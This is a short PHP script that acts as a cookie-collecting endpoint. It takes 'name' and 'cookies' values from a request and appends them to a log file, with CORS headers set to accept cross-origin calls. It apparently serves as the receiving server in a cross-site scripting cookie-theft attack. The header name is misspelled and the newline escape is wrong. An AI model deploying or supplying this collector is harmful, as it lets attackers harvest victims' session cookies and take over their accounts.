<?php
     header("Access-Control-Allow-Orgin: *");
     header("Access-Control-Allow-Credentials: true");

     $f = fopen("bogus.log", "a+");
     fputs($f, $_GET['name'] . ': ' . $_GET['cookies'] . "/n");
     fclose($f);
?>